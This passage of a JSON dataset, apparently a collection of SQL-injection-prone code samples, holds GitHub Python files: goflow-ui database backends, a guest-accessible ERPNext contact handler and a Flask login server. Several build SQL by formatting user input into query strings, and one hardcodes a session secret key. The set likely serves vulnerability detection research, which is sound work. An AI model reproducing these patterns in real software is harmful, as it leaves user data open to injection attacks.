\"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        # Filter tuples are filter values\n        self.filter_tuples = ()\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_tuples)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/adambaumeister/goflow-ui/blob/ef6a4d5639653ecfe27fd2335752fc98e7352075",
        "file_path": "/gfui/backends/Mysql/mysql.py",
        "source": "from gfui.backends.default import Backend\nimport mysql.connector\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Mysql_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = mysql.connector.connect(\n            host=self.OPTIONS['SQL_SERVER'],\n            user=self.OPTIONS['SQL_USERNAME'],\n            passwd=pw\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = db.cursor()\n        cursor.execute(\"USE testgoflow\")\n        cursor.execute(FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(\"USE testgoflow\")\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"inet_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"inet6_ntoa({0})\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n        print(self.filter_string)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM test_goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        print(q)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        print(q)\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/adambaumeister/goflow-ui/blob/ef6a4d5639653ecfe27fd2335752fc98e7352075",
        "file_path": "/gfui/backends/Timescaledb/timescaledb.py",
        "source": "from gfui.backends.default import Backend\nimport psycopg2\nfrom gfui.chartgraph import Graph, Table\nimport re\nimport ipaddress\nimport os\n\nclass Timescaledb_backend(Backend):\n    def __init__(self, OPTIONS):\n        super().__init__()\n        self.required_opts = ['SQL_SERVER', 'SQL_USERNAME', 'SQL_DB']\n        self.parse_options(OPTIONS)\n        self.columns = {}\n\n        pw = os.environ.get(\"SQL_PASSWORD\")\n        if not pw:\n            pw = self.OPTIONS['SQL_PASSWORD']\n\n        self.db = psycopg2.connect(\n            \"dbname={0} user={1} password={2} host={3}\".format(\n                self.OPTIONS['SQL_DB'],\n                self.OPTIONS['SQL_USERNAME'],\n                pw,\n                self.OPTIONS['SQL_SERVER']\n            )\n        )\n\n        self.schema = Schema()\n\n        self.filters = []\n\n    def get_columns(self):\n        return self.schema.get_columns()\n\n    def add_filter(self, op, value):\n        self.schema.add_filter(value, op)\n\n    def get_int_columns(self):\n        return self.schema.get_int_columns()\n\n    def flow_table(self, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS = self.schema.flows()\n\n        cursor = self.schema.query(db, FLOWS)\n        r = cursor.fetchall()\n        t = Table()\n        t = t.table_from_rows(r, self.schema.column_order)\n        return t\n\n    def topn_sum_graph(self, field, sum_by, limit=10):\n        db = self.db\n        self.schema.limit = limit\n        FLOWS_PER_IP = self.schema.topn_sum(field, sum_by)\n\n        cursor = db.cursor()\n        cursor.execute(FLOWS_PER_IP)\n        r = cursor.fetchall()\n        g = Graph()\n        g.name = \"TopN {0}\".format(field)\n        g.set_headers([\n            field,\n            \"Total\"\n        ])\n        g.graph_from_rows(r, 0)\n        return g\n\nclass Column:\n    \"\"\"\n    Column\n\n    Column handling class.\n    Governs how query strings are built and helper functons for returned data.\n    \"\"\"\n    def __init__(self, name, display_name=None):\n        self.name = name\n        self.display_name = display_name\n        self.type = 'text'\n        self.filter_string = None\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        if self.filter_string:\n            self.filter_string = self.filter_string + \"AND {2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n        else:\n            self.filter_string = \"{2} {0} \\\"{1}\\\"\".format(op, value, self.name)\n\nclass IP4Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            self.filter_string = \"({0} << '{1}'\".format(self.name, value)\n        else:\n            self.filter_string = \"{0} = '{1}'\".format(self.name, value)\n\n        return self.filter_string\n\nclass IP6Column(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = \"ip6\"\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        s = value.split(\"/\")\n        if len(s) > 1:\n            ip = ipaddress.ip_network(value, strict=False)\n            start_ip = ip.network_address\n            end_ip = ip.broadcast_address\n            self.filter_string = \"({0} > {1} AND {0} < {2})\".format(self.name, int(start_ip), int(end_ip))\n        else:\n            ip = ipaddress.ip_address(value)\n            self.filter_string = \"{0} = {1}\".format(self.name, int(ip))\n\n        return self.filter_string\n\nclass IntColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'int'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = {1}\".format(self.name, value)\n        return self.filter_string\n\nclass PortColumn(Column):\n    def __init__(self, name, display_name=None):\n        super().__init__(name, display_name)\n        self.type = 'port'\n\n    def select(self):\n        return \"{0}\".format(self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = \"{0} = %s\".format(self.name, value)\n        return self.filter_string\n\nclass Coalesce:\n    def __init__(self, name, columns, filter_func, display_name):\n        \"\"\"\n        Coalesce\n        Select from a list of columns whatever is not null\n        :param columns (List): Column objects\n        \"\"\"\n        self.name = name\n        self.columns = columns\n        # We assume that the passed columns are of roughly the same type\n        self.type = columns[0].type\n        self.column_selects = []\n        for c in columns:\n            self.column_selects.append(c.select())\n\n        self.filter_string = None\n        self.filter_func = filter_func\n        self.display_name = display_name\n\n    def get_display_name(self):\n        return self.display_name\n\n    def select(self):\n        fields = \", \".join(self.column_selects)\n        return \"COALESCE({0}) AS {1}\".format(fields, self.name)\n\n    def filter(self, value, op=None):\n        self.filter_string = self.filter_func(value, op)\n\nclass Schema:\n    \"\"\"\n    Schema\n\n    Defines the backend schema\n    Changes to the backend (naming, etc.) should be reflected here.\n    \"\"\"\n    def __init__(self):\n        # Default\n        self.limit = 10\n\n        self.column_order = [\n            \"last_switched\",\n            \"src_ip\",\n            \"src_port\",\n            \"dst_ip\",\n            \"dst_port\",\n            \"in_bytes\",\n        ]\n        src_ip_col = IP4Column(\"src_ip\", \"Source IP\")\n        src_ipv6_col = IP6Column(\"src_ipv6\", \"Source IPv6\")\n        dst_ip_col = IP4Column(\"dst_ip\", \"Destination IP\")\n        dst_ipv6_col = IP6Column(\"dst_ipv6\", \"DestinationIPv6\")\n\n        self.filter_val_list = []\n\n        # Columns\n        self.columns = {\n            \"last_switched\": Column(\"last_switched\", \"Last Switched\"),\n            \"src_ip\": Coalesce(\"src_c_ip\", [src_ip_col, src_ipv6_col], src_ip_col.filter, \"Source IP\"),\n            \"src_port\": PortColumn(\"src_port\", \"Source Port\"),\n            \"dst_ip\": Coalesce(\"dst_c_ip\", [dst_ip_col, dst_ipv6_col], dst_ip_col.filter, \"Destination IP\"),\n            \"dst_port\": PortColumn(\"dst_port\", \"Destination Port\"),\n            \"in_bytes\": IntColumn(\"in_bytes\", \"Input bytes\"),\n            \"in_pkts\": IntColumn(\"in_pkts\", \"Input Packets\"),\n        }\n\n        # Supported queries\n        self.QUERIES = {\n            \"TOPN\": self.topn\n        }\n\n        self.filters = []\n\n        self.filter_map = {\n            \"(\\d+\\-\\d+\\-\\d+)\": \"last_switched\",\n            \"src (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"src_ip\",\n            \"dst (\\d+\\.\\d+\\.\\d+\\.\\d+\\/\\d+|\\d+\\.\\d+\\.\\d+\\.\\d+)\": \"dst_ip\",\n            \"src ([0-9]+)($|\\s)\": \"src_port\",\n            \"dst ([0-9]+)($|\\s)\": \"dst_port\",\n        }\n\n    def add_filter(self, value, op=\"=\"):\n        for regex, column in self.filter_map.items():\n            if re.search(regex, value):\n                m = re.search(regex, value)\n                v = m.group(1)\n                self.columns[column].filter(v, op)\n                self.filter_val_list.append(v)\n\n    def build_filter_string(self):\n        s = 'WHERE '\n        l = []\n        for c in self.columns.values():\n            if c.filter_string:\n                l.append(c.filter_string)\n\n        if len(l) > 0:\n            return s + \" AND \".join(l)\n        else:\n            return ''\n\n    def get_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            result[col_name] = col.get_display_name()\n\n        return result\n\n    def get_int_columns(self):\n        result = {}\n        for col_name, col in self.columns.items():\n            if col.type is \"int\":\n                result[col_name] = col.get_display_name()\n\n        return result\n\n    def topn(self, column):\n        count = \"last_switched\"\n        q = \"\"\"\n        SELECT {0}, count({1}) AS c FROM goflow_records {2} GROUP BY {0} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), count, self.build_filter_string())\n        return self.query_boilerplate(q)\n\n    def topn_sum(self, column, sum_by):\n        q = \"\"\"\n        SELECT {0}, sum({1}) AS c FROM goflow_records {2} GROUP BY {3} ORDER BY c DESC\n        \"\"\".format(self.columns[column].select(), sum_by, self.build_filter_string(), self.columns[column].name)\n        return self.query_boilerplate(q)\n\n    def flows(self):\n        c = []\n        for col in self.column_order:\n            c.append(self.columns[col].select())\n        q = \"\"\"\n        SELECT {1} FROM goflow_records {0} ORDER BY last_switched DESC\n        \"\"\".format(self.build_filter_string(), \", \".join(c))\n        return self.query_boilerplate(q)\n\n    def query_boilerplate(self, q):\n        q = q + \"\"\"LIMIT {0}\"\"\".format(self.limit)\n        return q\n\n    def query(self, db, q):\n        cursor = db.cursor()\n        cursor.execute(q, self.filter_val_list)\n        return cursor",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/libracore/erpnext/blob/385e3bb28485240160cb650938f01dbda740dc8a",
        "file_path": "/erpnext/templates/utils.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ashwinjathar/ERP-Version10.x.x/blob/385e3bb28485240160cb650938f01dbda740dc8a",
        "file_path": "/erpnext/templates/utils.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# License: GNU General Public License v3. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe, json\nfrom frappe import _\nfrom frappe.utils import cint, formatdate\n\n@frappe.whitelist(allow_guest=True)\ndef send_message(subject=\"Website Query\", message=\"\", sender=\"\", status=\"Open\"):\n\tfrom frappe.www.contact import send_message as website_send_message\n\tlead = customer = None\n\n\twebsite_send_message(subject, message, sender)\n\n\tcustomer = frappe.db.sql(\"\"\"select distinct dl.link_name from `tabDynamic Link` dl\n\t\tleft join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'\n\t\tand c.email_id='{email_id}'\"\"\".format(email_id=sender))\n\n\tif not customer:\n\t\tlead = frappe.db.get_value('Lead', dict(email_id=sender))\n\t\tif not lead:\n\t\t\tnew_lead = frappe.get_doc(dict(\n\t\t\t\tdoctype='Lead',\n\t\t\t\temail_id = sender,\n\t\t\t\tlead_name = sender.split('@')[0].title()\n\t\t\t)).insert(ignore_permissions=True)\n\n\topportunity = frappe.get_doc(dict(\n\t\tdoctype ='Opportunity',\n\t\tenquiry_from = 'Customer' if customer else 'Lead',\n\t\tstatus = 'Open',\n\t\ttitle = subject,\n\t\tcontact_email = sender,\n\t\tto_discuss = message\n\t))\n\n\tif customer:\n\t\topportunity.customer = customer[0][0]\n\telif lead:\n\t\topportunity.lead = lead\n\telse:\n\t\topportunity.lead = new_lead.name\n\n\topportunity.insert(ignore_permissions=True)\n\n\tcomm = frappe.get_doc({\n\t\t\"doctype\":\"Communication\",\n\t\t\"subject\": subject,\n\t\t\"content\": message,\n\t\t\"sender\": sender,\n\t\t\"sent_or_received\": \"Received\",\n\t\t'reference_doctype': 'Opportunity',\n\t\t'reference_name': opportunity.name\n\t})\n\tcomm.insert(ignore_permissions=True)\n\n\treturn \"okay\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Daniel-Bu/w4111-project1/blob/54835e1eac1092a3bb6a40cebea4205e2437a1c6",
        "file_path": "/Web-app/Server.py",
        "source": "import os\nfrom sqlalchemy import *\nfrom flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session\nfrom flask_login import LoginManager, login_user, login_required, logout_user, current_user\nfrom Database import engine\nfrom User import User\n\n# set app and login system\ntmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')\napp = Flask(__name__, template_folder=tmpl_dir)\nlogin_manager = LoginManager()\nlogin_manager.init_app(app)\nlogin_manager.login_view = \"login\"\napp.secret_key = 'I love database'\n\n\n# Get current user's information\n@login_manager.user_loader\ndef load_user(s_id):\n    email = str(s_id)\n    query = '''select * from usr where email like\\'''' + email + '\\''\n    cursor = g.conn.execute(query)\n    user = User()\n    for row in cursor:\n        user.name = str(row.name)\n        user.email = str(row.email)\n        break\n    return user\n\n\n# Prepare the page\n@app.before_request\ndef before_request():\n  try:\n    g.conn = engine.connect()\n  except:\n    print \"uh oh, problem connecting to database\"\n    import traceback; traceback.print_exc()\n    g.conn = None\n\n\n@app.teardown_request\ndef teardown_request(exception):\n  try:\n    g.conn.close()\n  except Exception:\n    pass\n\n\n# @The function for user login\n@app.route(\"/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    error = None\n    page = 'login'\n    if request.method == 'POST':\n\n        # Obtain input value and pass to User object\n        email = str(request.form['email']).strip()\n        password = str(request.form['password']).strip()\n        user = User(email, password)\n        user.user_verify()\n\n        if not user.valid:\n            error = 'Invalid login information'\n        else:\n            session['logged_in'] = True\n            login_user(user)\n            print current_user.id\n            flash('You were logged in')\n            g.user = current_user.id\n            return redirect(url_for('user_home_page'))\n\n    return render_template('login.html', error=error, page=page)\n\n\n# @This function is for user sign-up\n@app.route(\"/signup\", methods=[\"GET\", \"POST\"])\ndef signup():\n    error = None\n    page = 'signup'\n    if request.method == 'POST':\n        name = str(request.form['username']).strip()\n        password = str(request.form['password']).strip()\n        email = str(request.form['email']).strip()\n        print name, password, email\n        newuser = User(email, password, name)\n        newuser.insert_new_user()\n        if not newuser.valid:\n            error = 'Invalid user information, please choose another one'\n        else:\n            session['logged_in'] = True\n            login_user(newuser)\n            flash('Thanks for signing up, you are now logged in')\n            return redirect(url_for('user_home_page'))\n    return render_template('signup.html', error=error, page=page)\n\n\n@app.route(\"/logout\")\n@login_required\ndef logout():\n    session.pop('logged_in', None)\n    logout_user()\n    return redirect(url_for('login'))\n\n\n'''\nThis part is the User Homepage, add app functions here\nModify user_home_page.html as well\n'''\n\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\n@login_required\ndef user_home_page():\n    message = 